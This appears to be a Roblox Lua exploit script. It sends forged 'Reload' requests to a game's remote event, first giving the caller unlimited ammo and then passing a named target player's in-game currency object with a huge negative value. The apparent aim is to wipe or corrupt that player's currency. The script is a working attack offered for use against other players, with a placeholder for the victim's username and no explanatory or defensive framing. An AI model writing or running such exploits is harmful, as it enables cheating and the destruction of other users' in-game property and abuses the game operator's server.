local player = "user" -- user of target

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
   "Reload",
   {
       Name = "[Revolver]",
       Ammo = {Value = math.huge*9e9},
       MaxAmmo = {Value = 0}
   }
)
task.wait(2)


game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
   "Reload",
   {
       Name = "[Revolver]",
       Ammo = game:GetService("Players")[player].DataFolder.Currency,
       MaxAmmo = {Value = -500000000000* 9}
   }
)